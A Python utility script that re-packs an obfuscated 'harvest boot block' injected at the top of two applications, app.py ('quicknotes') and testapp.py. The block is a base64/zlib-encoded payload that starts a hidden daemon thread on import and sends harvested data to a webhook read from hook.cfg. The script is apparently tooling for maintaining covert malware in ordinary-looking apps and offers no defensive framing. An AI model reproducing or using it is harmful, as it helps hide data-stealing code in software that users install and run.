"""Rebuild the encoded harvest boot block at the top of an injected app.

    python _repack.py            # app.py + testapp.py, webhook from hook.cfg
    python _repack.py app.py     # just one

The blob is the payload source with WEBHOOK / APP_ID substituted, so a stale
blob keeps sending to an old hook and keeps an old payload. Re-packing is the
fix for both.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

import inject

ROOT = Path(__file__).resolve().parent
CFG = ROOT / "hook.cfg"

BOOT_RE = re.compile(
    r"import base64, threading, zlib\n"
    r"_K = '[^']*'; _P = '[^']*'\n"
    r"_g = .*?\n"
    r"threading\.Thread\(target=_g\[\"start\"\], daemon=True\)\.start\(\)\n",
    re.S,
)

TARGETS = (("app.py", "quicknotes"), ("testapp.py", "testapp"))


def repack(name: str, app_id: str, webhook: str) -> None:
    path = ROOT / name
    if not path.is_file():
        print(f"{name}: missing")
        return
    text = path.read_text(encoding="utf-8")
    match = BOOT_RE.search(text)
    if not match:
        print(f"{name}: no boot block, skipped")
        return
    boot = inject.pack(webhook, app_id)
    new = text[:match.start()] + boot + "\n\n" + text[match.end():]
    compile(new, name, "exec")
    path.write_text(new, encoding="utf-8", newline="\n")
    print(f"{name}: repacked  app_id={app_id}  hook=...{webhook[-6:]}")


def main(argv: list[str]) -> int:
    webhook = CFG.read_text(encoding="utf-8").strip()
    if not webhook:
        print("hook.cfg is empty")
        return 2
    wanted = set(argv[1:])
    for name, app_id in TARGETS:
        if wanted and name not in wanted:
            continue
        repack(name, app_id, webhook)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
